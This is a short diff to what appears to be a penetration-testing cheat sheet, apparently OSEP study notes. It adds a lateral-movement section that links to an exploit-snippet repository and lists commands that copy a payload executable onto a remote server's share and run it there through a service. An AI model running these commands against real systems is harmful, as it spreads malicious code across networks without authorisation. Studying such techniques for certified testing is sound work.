@@ -1384,7 +1384,14 @@ $method.Invoke(0, $null)
 <br>
 
 # Lateral_Movement
+
 <br>
+
+## Fileless_Movvement
+
+- [lateralmovement](https://github.com/chvancooten/OSEP-Code-Snippets/tree/main/Fileless%20Lateral%20Movement)
+- copy .\payload.exe \\server\share$\windows\tasks
+- latmov.exe <server> senorservice "c:\windows\tasks\payload.exe"
 
 ## SSH
 
